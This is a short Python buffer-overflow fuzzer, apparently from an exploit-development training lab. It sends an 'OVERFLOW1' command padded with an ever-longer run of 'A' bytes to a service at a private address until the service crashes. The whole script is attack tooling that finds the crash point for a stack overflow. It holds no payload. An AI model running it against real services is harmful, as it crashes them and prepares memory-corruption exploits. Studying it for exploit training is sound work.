import socket, time, sys

ip = "10.0.2.4"
port = 1337
timeout = 5

buffer = "A" * 100

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(timeout)
		conn = s.connect((ip, port))
		s.recv(1024)
		print("Fuzzing with {} bytes".format(len(buffer)))
		msg = "OVERFLOW1 " + buffer + "\r\n"
		s.send(msg)
		buffer = buffer + "A" * 100
		s.recv(1024)
		s.close()
		time.sleep(1)
	except:
		print("Could not connect to {}:{} ".format(ip, str(port)))
		sys.exit(0)
